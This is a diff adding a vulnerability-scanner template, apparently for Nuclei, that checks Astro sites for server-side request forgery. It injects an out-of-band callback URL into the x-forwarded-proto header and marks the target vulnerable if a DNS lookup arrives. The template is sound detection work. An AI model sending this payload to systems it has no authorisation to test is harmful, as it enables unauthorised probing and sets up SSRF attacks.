@@ -1,0 +1,22 @@
+id: astro-ssrf
+
+info:
+  name: Astro ssrf
+  author: omkar7505
+  severity: high
+  description: Astro ssrf with `x-forwarded-proto` header
+  tags: ssrf,oast
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        x-forwarded-proto: https://{{interactsh-url}}?
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
